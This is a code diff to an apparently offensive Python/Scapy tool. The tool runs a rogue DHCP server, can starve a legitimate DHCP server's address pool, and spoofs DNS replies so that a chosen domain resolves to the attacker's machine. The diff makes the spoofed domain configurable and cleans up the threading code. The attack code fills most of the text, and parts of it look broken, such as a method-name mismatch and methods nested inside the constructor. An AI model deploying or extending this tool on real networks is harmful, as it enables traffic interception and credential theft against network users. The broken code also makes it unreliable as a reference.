@@ -29,7 +29,6 @@ def checkArgs():
 	parser.add_argument("netmask", help="DHCP netmask")
 	parser.add_argument("-s", "--starve", action="store_true", help="Sends DISCOVER packets to deplete existing DHCP server's pool")
 	parser.add_argument("-d", "--domain", dest="domain", help="DNS domain to spoof")
-	parser.add_argument("-t", "--target", dest="target", help="DNS IP to direct to")
 
 	args = parser.parse_args()
 	interface = args.interface
@@ -40,9 +39,8 @@ def checkArgs():
 	if args.starve != None:
 		starve = args.starve
 
-	if args.domain != None and args.target != None:
+	if args.domain != None:
 		domain = args.domain
-		target = args.target
 		dns = True
 
 	if atol(start_ip) > atol(end_ip):
@@ -157,8 +155,8 @@ class dhcp_server(threading.Thread):
 			raw[Ether].dst, raw[IP].dst = pkt[Ether].src, "255.255.255.255"
 			raw[BOOTP]= BOOTP(op = 2, # reply
 							  xid = pkt[BOOTP].xid,
-            				  chaddr= self.mac2bin(pkt[Ether].src),
-            				  yiaddr="0.0.0.0")/DHCP()
+							  chaddr= self.mac2bin(pkt[Ether].src),
+							  yiaddr="0.0.0.0")/DHCP()
 
 			DhcpOption=[
 				#('client_id', chr(1), self.mac2bin(pkt[Ether].src))
@@ -192,7 +190,7 @@ class dhcp_server(threading.Thread):
 						  BootpHeader/
 						  DHCP(options=[("message-type","nak"),("server_id",self.myIP),"end"]))
 					sendp(nak ,verbose=0, iface=self.iface)
-                
+				
 				else:
 					if Mtype == 1:
 						# Respond to DISCOVER Packets
@@ -281,13 +279,13 @@ class DNS_server(threading.Thread):
 		self.myIP = get_if_addr(interface)
 		self.filter = "udp port 53 and ip dst " + self.myIP
 		self.kill = False
-
+		self.parse_args(**kwargs)
 		def run(self):
 			while not self.kill:
 				sniff(filter=self.filter, prn=detect_dns, iface=interface)
 
 		def parser_args(self,**kwargs):
-		"""Sets keyword arguments into attributes"""
+			"""Sets keyword arguments into attributes"""
 			for key, value in kwargs.items():
 				print "setting attribute",key, ":",value
 				setattr(self, key, value)
@@ -295,11 +293,11 @@ class DNS_server(threading.Thread):
 		def detect_dns(self, pkt):
 			if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
 
-				if "www.google.com" in str(pkt["DNS Question Record"].qname):
-					spf_resp = IP(dst=pkt[IP].src)/
+				if self.domain in str(pkt["DNS Question Record"].qname):
+					spf_resp = (IP(dst=pkt[IP].src)/
 							   UDP(dport=pkt[UDP].sport, sport=53)/
 							   DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=self.myIP)/
-							   DNSRR(rrname="www.google.com",rdata=self.myIP))
+							   DNSRR(rrname=self.domain,rdata=self.myIP)))
 
 					sendp(spf_resp, iface=interface)
 					print "Sent spoofed response to %s" % pkt[IP].src
@@ -314,9 +312,9 @@ class DNS_server(threading.Thread):
 						verbose=0,
 					)
 
-					resp_pkt = IP(dst=pkt[IP].src, src=self.myIP)/
+					resp_pkt = (IP(dst=pkt[IP].src, src=self.myIP)/
 							   UDP(dport=pkt[UDP].sport)/
-							   DNS()
+							   DNS())
 					resp_pkt[DNS] = response[DNS]
 
 					sendp(resp_pkt, iface=interface, verbose=0)
@@ -333,7 +331,11 @@ if __name__ == "__main__":
 		"start_sip": start_ip,
 		"start_eip": end_ip,
 	}
-
+    
+	dns_kargs = {
+		"domain": domain,
+	}
+    
 	if starve:
 		print "Starting DHCP starvation"
 		t=dhcp_starve()
@@ -348,6 +350,6 @@ if __name__ == "__main__":
 	threadPool.append(t)
 
 	if dns:
-		t = DNS_server()
+		t = DNS_server(**dns_kargs)
 		t.start()
 		threadPool.append(t)
